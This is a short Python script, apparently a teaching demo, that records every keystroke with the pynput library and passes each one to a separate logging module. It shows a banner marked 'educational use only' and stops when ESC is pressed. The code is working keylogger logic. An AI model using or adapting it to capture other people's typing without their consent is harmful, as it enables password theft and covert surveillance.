from pynput import keyboard
from logger import write_log

print("=" * 50)
print("Keystroke Monitoring Application")
print("Educational use only")
print("Press ESC to stop logging")
print("=" * 50)


def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        write_log(str(key))


def on_release(key):
    if key == keyboard.Key.esc:
        print("\nLogging stopped by user.")
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
